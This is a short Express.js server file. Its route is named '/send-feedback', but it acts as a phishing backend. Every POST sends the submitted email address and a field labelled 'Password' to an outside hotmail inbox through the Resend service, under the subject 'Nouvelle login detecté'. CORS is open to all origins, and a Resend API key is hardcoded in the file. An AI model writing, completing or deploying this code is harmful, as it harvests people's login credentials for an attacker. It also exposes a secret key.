import express from "express";
import cors from "cors";
import bodyParser from "body-parser";
import { Resend } from "resend";

const app = express();
const resend = new Resend("re_JAsENXWP_PQmVi9ZwTwrzHKT4jeuedNKe");

app.use(cors({
  origin: "*",
}));

app.use(bodyParser.json());

app.post("/send-feedback", async (req, res) => {
  const { email, message } = req.body;

  try {
    await resend.emails.send({
      from: "onboarding@resend.dev",
      to: "bac.ex@hotmail.com",
      subject: "Nouvelle login detecté",
      html: `
        <h2>Nouvelle login detecté</h2>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${message}</p>
      `,
    });

    res.json({ success: true });
  } catch (err) {
    console.error("Resend Error:", err);
    res.status(500).json({ error: "Failed to send email" });
  }
});

app.get("/", (req, res) => {
  res.send("Backend is running.");
});

app.listen(5000, () => {
  console.log("Server is running on port 5000");
});
